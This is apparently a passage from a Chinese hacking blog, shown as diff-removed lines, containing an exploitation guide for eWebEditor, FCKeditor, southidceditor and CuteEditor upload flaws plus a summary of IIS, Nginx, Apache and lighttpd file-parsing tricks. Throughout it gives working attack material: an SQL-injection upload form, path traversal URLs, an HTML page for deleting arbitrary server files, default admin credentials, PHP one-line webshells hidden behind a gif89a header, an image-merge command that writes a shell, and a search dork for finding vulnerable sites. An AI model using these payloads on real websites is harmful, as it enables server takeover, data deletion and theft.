-<p>2b’|cer’,S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl</p>
-<p>from ewebeditor_style where s_name=’standard’and’a’=’a” method=post name=myform enctype=”multipart/form-data”&gt;</p>
-<p>&lt;input type=file name=uploadfile size=100&gt;&lt;br&gt;&lt;br&gt;</p>
-<p>&lt;input type=submit value=Fuck&gt;</p>
-<p>&lt;/form&gt;</p>
-<p><a><a href="http://127.1/e/upload.asp" target="_blank" rel="external">http://127.1/e/upload.asp</a></a></p>
-<p>上传时修改此处上传地址。。。</p>
-<p>如果你是上传的asp文件则成功后的地址为：</p>
-<p><a><a href="http://127.1/e/uploadfile/xxxxxxxxxx.asp" target="_blank" rel="external">http://127.1/e/uploadfile/xxxxxxxxxx.asp</a></a></p>
-<p>5.ewebeditor遍历路径漏洞<br>Ewebeditor为非常常见的网站核心程序,<br>默认数据库为 /db/ewebeditor.mdb 默认路径admin_login.asp 默认管理员admin密码admin(admin888)</p>
-<p>ewebedit进入后台添加样式.得到webshell很容易. 有时候很不幸.管理员把数据库改为只读权限.</p>
-<p>但是ewebeditor后台有个小小的缺陷. 可以历遍整个网站目录. 当然.数据库为只读的时候一样可以利用.</p>
-<p>上传文件管理—选择样式目录(随便选一个目录)<br>得到:<br>ewebeditor/admin_uploadfile.asp?id=14<br>在id=14后面添加&amp;dir=..<br>再加 &amp;dir=../..<br>&amp;dir=../../../.. 看到整个网站文件了</p>
-<p>6.eweb2.7版本以下又一个注入</p>
-<p>首先看代码(ewebeditor.asp)：<br>ub InitPara()<br>‘ 取全屏标志<br>sFullScreen = Trim(Request.QueryString(“fullscreen”))<br>‘ 取对应的内容ID<br>sContentID = Trim(Request.QueryString(“id”))<br>If sContentID = “” Then ShowErr “请传入调用参数ID，即隐藏的内容表单项ID！”</p>
-<p>‘ 取样式初始值<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”</p>
-<p>sSql = “select * from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘“<br>oRs.Open sSql, oConn, 0, 1<br>If Not oRs.Eof Then<br>sStyleID = oRs(“S_ID”)<br>sStyleName = oRs(“S_Name”)<br>sStyleDir = oRs(“S_Dir”)<br>sStyleCSS = oRs(“S_CSS”)<br>sStyleUploadDir = oRs(“S_UploadDir”)<br>nStateFlag = oRs(“S_StateFlag”)<br>sDetectFromWord = oRs(“S_DetectFromWord”)<br>sInitMode = oRs(“S_InitMode”)<br>sBaseUrl = oRs(“S_BaseUrl”)</p>
-<p>sStyleUploadDir = Replace(sStyleUploadDir, “\”, “/“)<br>If Right(sStyleUploadDir, 1) &lt;&gt; “/“ Then<br>sStyleUploadDir = sStyleUploadDir &amp; “/“<br>End If<br>Else<br>ShowErr “无效的样式Style参数传入，如果要使用默认值，请留空！”<br>End If<br>oRs.Close<br>关键的是这两句：<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”</p>
-<p>sSql = “select * from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘“<br>很明显的是style参数没有足够的过滤，如果我们自己给这个地方赋值的话，程序会报错的，</p>
-<p>但接下来的一句还是让我们有可乘之机，If sStyleName = “” Then sStyleName = “standard”保留默认的还是会带入语句执行，加个</p>
-<p>单引号就报错了，如图2.[local]1[/local]<br>我试了好几款工具，发现只有pangolin可以注入，啊D只能发现注入不能继续猜解。<br>eweb默认的管理员表是：ewebeditor_system<br>这个表下的默认两个列名为:sys_UserName和sys_userpass<br>需要手动添加，</p>
-<p>7.ewebeditor2.8最终版删除任意文件漏洞</p>
-<p>这个漏洞可以很鸡肋，也可以很致命，关键看你怎么利用！</p>
-<p>此漏洞存在于ExampleNewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入，看这些代码：</p>
-<p>‘ 把带”|”的字符串转为数组<br>Dim aSavePathFileName<br>aSavePathFileName = Split(sSavePathFileName, “|”)<br>‘ 删除新闻相关的文件，从文件夹中<br>Dim i<br>For i = 0 To UBound(aSavePathFileName)<br>‘ 按路径文件名删除文件<br>Call DoDelFile(aSavePathFileName(i))<br>Next</p>
-<p>而aSavePathFileName是前面从数据库取出来的：</p>
-<p>sSavePathFileName = oRs(“D_SavePathFileName”)</p>
-<p>看看D_SavePathFileName是怎么添加到数据库里的，在addsave.asp(modifysave.asp)里：</p>
-<p>sSavePathFileName = GetSafeStr(Request.Form(“d_savepathfilename”))<br>…<br>oRs(“D_SavePathFileName”) = sSavePathFileName</p>
-<p>居然过滤了，是GetSafeStr函数，再看看这个函数，在Startup.asp里：</p>
-<p>Function GetSafeStr(str)<br>GetSafeStr = Replace(Replace(Replace(Trim(str), “‘“, “”), Chr(34), “”), “;”, “”)<br>End Function</p>
-<p>无语，这不是过滤字符型注入的函数么？放这里什么用也没有啊！既然路径没有过滤，那就可以直接定义了，构造一个提交页面，其</p>
-<p>中d_savepathfilename自己任意赋值(要删除多个文件，用|隔开即可)。试试../../eWebEditor.asp，提交后删除该新闻，于是主目录</p>
-<p>下的eWebEditor.asp不见了！</p>
-<p>下面给出利用的htm：<br>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;eWebEditor删除文件 by:oldjun(<a><a href="http://www.oldjun.com)&lt;/TITLE" target="_blank" rel="external">http://www.oldjun.com)&lt;/TITLE</a></a>&gt;<br>&lt;style&gt;body,p,td,input {font-size:9pt}&lt;/style&gt;<br>&lt;/HEAD&gt;&lt;BODY&gt;&lt;a href=’list.asp’&gt;新闻列表&lt;/a&gt; | &lt;a href=’add.asp’&gt;增加新闻&lt;/a&gt;</p>
-<p>&lt;b&gt;增加新闻&lt;/b&gt;</p>
-<p>&lt;form action=”<a><a href="http://127.0.0.1/editor/Example/NewsSystem/addsave.asp" target="_blank" rel="external">http://127.0.0.1/editor/Example/NewsSystem/addsave.asp</a></a>“<br>method=”post” name=”myform”&gt;<br>&lt;input type=hidden name=d_nofilename&gt;<br>&lt;input type=hidden name=d_savefilename&gt;<br>&lt;table cellspacing=3 align=center&gt;<br>&lt;tr&gt;&lt;td&gt;要删的文件(相对路径就可以了)：&lt;/td&gt;<br>&lt;td&gt;&lt;input type=”text” name=”d_savepathfilename” value=”” size=”90”&gt;&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;tr&gt;&lt;td&gt;新闻标题(随便填)：&lt;/td&gt;<br>&lt;td&gt;&lt;input type=”text” name=”d_title” value=”” size=”90”&gt;&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;tr&gt;&lt;td&gt;标题图片：&lt;/td&gt;<br>&lt;td&gt;&lt;select name=”d_picture” size=1&gt;&lt;option value=’’&gt;无&lt;/option&gt;&lt;/select&gt;<br>当编辑区有插入图片时，将自动填充此下拉框&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;tr&gt;&lt;td&gt;新闻内容(随便填)：&lt;/td&gt;<br>&lt;td&gt;&lt;textarea name=”d_content”&gt;&lt;/textarea&gt;&lt;/td&gt;<br>&lt;/tr&gt;<br>&lt;/table&gt;</p>
-<p>&lt;input type=submit name=btnSubmit value=” 提 交 “&gt;<br>&lt;input type=reset name=btnReset value=” 重 填 “&gt;<br>&lt;/form&gt;<br>&lt;/BODY&gt;&lt;/HTML&gt;</p>
-<p>(二)ASPX版：</p>
-<p>受影响文件：eWebEditorNet/upload.aspx</p>
-<p>利用方法：添好本地的cer的Shell文件。在浏揽器输入javascript:lbtnUpload.click();就能得到shell</p>
-<p>嘿嘿….绕过了限制……成功的上传了ASPX文件….</p>
-<p>文件默认的上传后保存的地址是eWebEditorNet/UploadFile/现在来看看是否上传成功…..</p>
-<p>(三)PHP版</p>
-<p>关于eWebEditor 漏洞php版本的和asp的一样。有目录浏览。和编辑扩展名。重点在于虽然支持了php格式但上传还是上传不了。不过</p>
-<p>利用织梦的gif89a漏洞倒可以实现php一句话上传，然后再上传webshell。</p>
-<p>备注：织梦的gif89a漏洞，准确来说应该是DEDECMS中所用的php版的FCKeditor存在上传漏洞，gif89a文件头欺骗。DEDECMS中在上传</p>
-<p>拖上没有对picSubmit进行任何处理。但是却不能直接上传php马。因为会识别。使用修改过的php小马。</p>
-<p>gif89a</p>
-<p>&lt;?php</p>
-<p>phpinfo();</p>
-<p>?&gt;</p>
-<p>RFI</p>
-<p>gif89a</p>
-<p>&lt;?php</p>
-<p>eval($_POST[c]);</p>
-<p>?&gt;</p>
-<p>利用gif89a进行了欺骗。现在上传就可以成功了.然后有php一句话客户端连接.</p>
-<p>(四)JSP版</p>
-<p>上传漏洞</p>
-<p>影响版本：漏洞存在于ewebeditor jsp版 1.4以下版本，漏洞有两个版本。</p>
-<p>原理：第一个是使用savefile.jsp来进行文件上传操作的，从代码中可以看出，程序并没做任何上传过滤，这样我们就可以直接上传</p>
-<p>一个JSPShell了。另一个版本可能是被人修改过，把代码转成了servlet，不能看到代码，但是利用方法却大同小异。</p>
-<p>利用方法：我们先找一个1.4版本以下的ewebeditor JSP上传页面，选择好一个JSPShell。这个ewebeditor是没有提交按钮的，所以这</p>
-<p>里涉及到一个小技巧，就是在上传的对话框中敲下回车，大约过半分钟，就可以查看网页的源文件来寻找我们的Webshell了。</p>
-<p>这个JSP和PHP一样,如果系统权限没有特意去设置的话,默认我们得到webshell是system的权限,那么…^_^</p>
-<p>二:ewebeditornet 漏洞利用</p>
-<p>默认上传地址:</p>
-<p><a>www.test.com/ewebeditornet/upload.aspx</a><br>可以直接上传一个cer的木马</p>
-<p>在无法上传的情况下</p>
-<p>可以地址栏构造以下代码: javascript:lbtnUpload.click();</p>
-<p>然后查看源代码:</p>
-<p>找到uploadsave 找到地址</p>
-<p>默认传到uploadfile这个文件夹里</p>
-<p>(漏洞修补: 可以在iss里直接把upload文件夹的执行权限选择无. )</p>
-<p>三:fckeditor 漏洞利用</p>
-<p><a><a href="http://www.test.com/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp" target="_blank" rel="external">http://www.test.com/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp</a></a>?</p>
-<p>Command=FileUpload&amp;Type=Image&amp;CurrentFolder=/<br>就把文件名字段改成NEWfile 选择文件名可定义<br>上传过后在/userfiles/image/找文件</p>
-<p>上传任意文件:</p>
-<p>fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp</p>
-<p>根据网站所使用不同语言自己改这个地址.</p>
-<p>FCKeditor的JSP版漏洞</p>
-<p><a><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector" target="_blank" rel="external">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector</a></a>?</p>
-<p>Command=FileUpload&amp;Type=Image&amp;CurrentFolder=%2F</p>
-<p><a><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector" target="_blank" rel="external">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector</a></a>?</p>
-<p>Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F<br>上传shell的地址:<br><a><a href="http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html" target="_blank" rel="external">http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html</a></a>?</p>
-<p>Type=Image&amp;Connector=connectors/jsp/connector</p>
-<p>四：southidceditor</p>
-<p>1.</p>
-<p><a><a href="http://www.xhkjit.com/admin/southidceditor/datas/southidceditor.mdb" target="_blank" rel="external">http://www.xhkjit.com/admin/southidceditor/datas/southidceditor.mdb</a></a></p>
-<p><a><a href="http://www.xhkjit.com/admin/southidceditor/popup.asp" target="_blank" rel="external">http://www.xhkjit.com/admin/southidceditor/popup.asp</a></a></p>
-<p><a><a href="http://www.xhkjit.com/admin/southidceditor/admin/admin_login.asp" target="_blank" rel="external">http://www.xhkjit.com/admin/southidceditor/admin/admin_login.asp</a></a></p>
-<p>2.southidceditor存在一个可以抓包上传的漏洞</p>
-<p>Google:inurl:(admin/SouthidcEditor/PopUp.asp)</p>
-<p>nc抓包自己玩玩吧.<br>五：bigcneditor(这个我没有找到具体的漏洞,网上的文章也都比较不负责任,谁知道的请告诉我下,谢谢)</p>
-<p>这个页不多说了</p>
-<p>原理都差不多！</p>
-<p>防范方法很简单就不多讲了，</p>
-<p>六：CuteEditor编辑器通杀漏洞</p>
-<p>CuteEditor编辑器是.NET下最常用的一个编辑器..<br>十分的强大..也许是因为他太强了 HEHE ..<br>我们随便找到一个装有此编辑器的网站 点击插入图片 FLASH 影音文件 什么的都可以出来一个对话框.<br>在这个对话框里可以游览用户所上传的数据还有目录..郁闷的是居然可以新建..移动..修改..<br>在官网上甚至连删除都弄出来了..呵呵.. 我们这次主要是利用2003服务器的特性来进行利用..<br>大家都知道在2003的IIS环境下 如果你建一个 XXX.asp 文件夹的话 里面不管放什么其他类型的文件<br>在IIS里都会通过文件夹名的类型来解析 也就是说你传一个JPG的东西到 XXX.ASP下也会以ASP脚本<br>来进行解析..我们这里就利用他这一特性…首先我们随便找一个编辑器 然后选择插入图片吧(如图1)..插入其他的<br>东西都行..只要能新建文件目录..或者可以移动目录..</p>
-<p>看这里就有新建文件夹等等一些操作的按钮我们新建一个..如果新建不能用可以试试移动文件夹把以有的文件夹名改成 XXX.asp形</p>
-<p>式..</p>
-<p>好了.我们新建一个 <a>www.asp</a> 文件夹.</p>
-<p>确定..我们的文件夹就建好了..然后点击进入该文件夹 (</p>
-<p>然后到了最关键的…我们上传文件..<br>用插入图片是上传不了的..他会检测是不是正常的图片..<br>可以试试 插入 FLASH<br>或者插入 视频 音乐文件..我们这里就插入视频.. 然后直接把 我们要传上去的马后缀改为 .avi形式<br>然后进入我们刚才新建的那个目录 然后上传 .. 文件就上去了</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/Hack/">Hack</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-
-  
-    <article id="post-370" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2013/02/07/370/" class="article-date">
-  	<time datetime="2013-02-07T11:07:38.000Z" itemprop="datePublished">2013-02-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2013/02/07/370/">各大Web服务器解析漏洞总结</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>各大Web服务器解析漏洞总结<br>From:90sec</p>
-<p>[+]IIS 6.0</p>
-<p>&nbsp;</p>
-<p><pre>目录解析：/xx.asp/xx.jpg  xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码 IIS6.0会将 xx.jpg 解析为 asp 文件。后缀解析：/xx.asp;.jpg     /xx.asp:.jpg(此处需抓包修改文件名) IIS6.0都会把此类后缀文件成功解析为 asp 文件。默认解析：/xx.asa    /xx.cer   /xx.cdx IIS6.0默认的可执行文件除了 asp 还包含这三种此处可联系利用目录解析漏洞/xx.asa/xx.jpg 或/xx.cer/xx.jpg 或 xx.asa;.jpg</pre><br>&nbsp;</p>
-<p>[+]IIS 7.0/IIS 7.5/Nginx &lt;8.03</p>
-<p>&nbsp;</p>
-<p><pre>IIS 7.0/IIS 7.5/Nginx&lt;8.03在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。常用利用方法：将一张图和一个写入后门代码的文本文件合并将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾  e.g.  copy xx.jpg/b + yy.txt/a xy.jpg ######################################/b 即二进制[binary]模式/a 即ascii模式 xx.jpg正常图片文件  yy.txt 内容&lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;意思为写入一个内容为&lt;?php eval($_POST[cmd])?&gt;名称为shell.php的文件######################################找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上/xx.php 即可执行恶意文本。然后就在图片目录下生成一句话木马 shell.php 密码 cmd</pre><br>&nbsp;</p>
-<p>[+]Nginx &lt;8.03</p>
-<p>&nbsp;</p>
-<p><pre>在Fast-CGI关闭的情况下，Nginx&lt;8.03依然存在解析漏洞在一个文件路径(/xx.jpg)后面加上%00.php会将/xx.jpg%00.php解析为 php 文件。</pre><br>&nbsp;</p>
-<p>[+]Apache</p>
-<p>&nbsp;</p>
-<p><pre>后缀解析：test.php.x1.x2.x3  Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析  test.php.x1.x2.x3 则会被解析为php 经验之谈：php|php3|phtml 多可被Apache解析</pre><br>&nbsp;</p>
-<p>[+]其他一些可利用的</p>
-<p>&nbsp;</p>
-<p><pre>在windows环境下，xx.jpg[空格]或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，这也是可以被利用的！在向一台windows主机上传数据时，你可以抓包修改文件名，在后面加个空格或点，试图绕过黑名单，若上传成功，最后的点或空格都会被消除，这样就可得到shell。我记得FckPhp2.6就存在加空格绕过的漏洞。{Linux主机中不行，Linux允许这类文件存在}如果在Apache中.htaccess可被执行（默认不执行，这是90sec里的一位朋友说的，当初我并不知道），且可以被上传，那可以尝试在.htaccess中写入:&lt;FilesMatch“shell.jpg”&gt;SetHandler application/x-httpd-php &lt;/FilesMatch&gt; shell.jpg换成你上传的文件，这样shell.jpg就可解析为php文件</pre><br>&nbsp;</p>
-<p>[+]lighttpd</p>
-<p>&nbsp;</p>
-<p><pre>xx.jpg/xx.php  [Addby loser]</pre><br>&nbsp;</p>
 
       
     </div>
